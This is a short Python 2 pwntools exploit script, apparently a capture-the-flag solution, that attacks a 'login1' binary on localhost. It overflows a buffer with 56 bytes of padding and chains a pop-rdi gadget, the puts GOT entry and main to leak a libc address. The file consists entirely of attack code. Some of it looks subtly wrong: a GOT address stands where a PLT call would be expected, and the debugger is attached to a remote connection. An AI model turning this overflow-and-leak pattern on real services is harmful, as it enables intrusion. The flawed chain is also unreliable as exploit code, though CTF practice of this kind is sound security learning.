from pwn import *
context.log_level = 'debug'

TARGET = './login1'
HOST = 'localhost'
PORT = 10001

# r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
r = remote(HOST, PORT)

gdb.attach(r, '''
''')
elf = ELF(TARGET)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))



rdi = 0x00400aa3

r.recvuntil('ID:')

payload = ''
payload += 'A' * 56
payload += p64(rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.got['puts'])
payload += p64(elf.sym['main'])

r.sendline(payload)


r.interactive()
r.close()
